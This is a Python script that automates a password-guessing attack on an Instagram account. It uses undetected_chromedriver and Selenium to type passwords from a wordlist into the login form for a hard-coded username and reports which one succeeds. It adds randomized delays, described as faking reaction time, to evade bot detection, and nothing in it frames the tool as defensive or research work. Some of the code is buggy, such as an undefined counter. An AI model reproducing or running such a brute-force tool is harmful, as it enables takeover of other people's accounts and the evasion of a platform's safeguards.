import random

import undetected_chromedriver as uc
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver import Keys
from selenium.webdriver.common.by import By

import time
import logging

FORMAT = '%(asctime)s - %(levelname)s:%(message)s'
streamformat = logging.Formatter("%(asctime)s - %(levelname)s:%(message)s'")
logging.basicConfig(filename='info.log', filemode='w', encoding='utf-8', level=logging.INFO, format=FORMAT,
                    datefmt="%H:%M:%S")

#
# UNDETECTED chromedriver var0
#
driver = uc.Chrome()

connexion_url = 'https://www.instagram.com/accounts/login/'
account = 'Tim0ut_13'
file_path = '../Resources/test.txt'


def fake_time_wait(min=0.2, max=1.1):
    t = random.uniform(min, max)
    time.sleep(t)
    logging.info(f'Faking reaction time : {round(t, 3)}')


def file_to_list(path):
    with open(path, 'r') as f:
        lines = f.readlines()
    return lines


def read_words(lines):
    words = map(lambda line: line.split(), lines)
    for word in words:
        yield word


def navigate_to_home():
    timeout_time = 0.5
    driver.implicitly_wait(timeout_time)

    try:
        logging.info(f'Navigate to {connexion_url}...')
        driver.get(connexion_url)
    except TimeoutException as ex:
        logging.error(f'Connexion timeout ({ex})')
        driver.close()

    try:
        fake_time_wait()
        cookie_reject_btn = driver.find_element(By.XPATH, "//*[text()='Refuser les cookies optionnels']")
        cookie_reject_btn.click()
    except NoSuchElementException as ex:
        logging.info(f'Cookies message not found ({ex})')
    login_loop()


def login_loop():
    fake_time_wait()
    username_input = driver.find_element(By.NAME, 'username')
    password_input = driver.find_element(By.NAME, 'password')
    connect_btn = driver.find_element(By.XPATH,
                                      "/html/body/div[2]/div/div/div[2]/div/div/div/div[1]/section/main/div/div/div[1]/div[2]/form/div/div[3]/button/div")

    try:
        logging.info(f'Logging to account : {account}')
        fake_time_wait()
        username_input.send_keys(account)
    except NoSuchElementException as ex:
        logging.error(f'Username input not found')
        logging.error(f'{ex}')
        driver.close()

    for password in read_words(file_to_list(file_path)):

        try:
            logging.info(f"Trying password : {password}")
            fake_time_wait()
            password_input.send_keys(password)
        except NoSuchElementException as ex:
            logging.error(f'Password input not found')
            logging.error(f'{ex}')
            driver.close()

        try:
            time.sleep(1)
            connect_btn.click()
        except NoSuchElementException as ex:
            logging.error(f'Connexion button not found')
            logging.error(f'{ex}')
            driver.close()

        try:
            global count
            count += 1
            time.sleep(2)
            password_msg = driver.find_element(By.CLASS_NAME, "_ab2z")

            if password_msg.is_displayed():
                logging.info(f'Trying {count} - Wrong password : {password}')
                print(f'Trying {count} - Wrong password : {password}')
                time.sleep(0.3)
                for _ in range(len(password[0]) + 1):
                    password_input.send_keys(Keys.BACKSPACE)
                fake_time_wait()
            else:
                logging.info(f'Trying {count} - CORRECT : {password}')
                print(f'Trying {count} - CORRECT : {password}')

        except Exception as ex:
            logging.error(f'Error entering password.')
            logging.error(f'{ex}')


navigate_to_home()
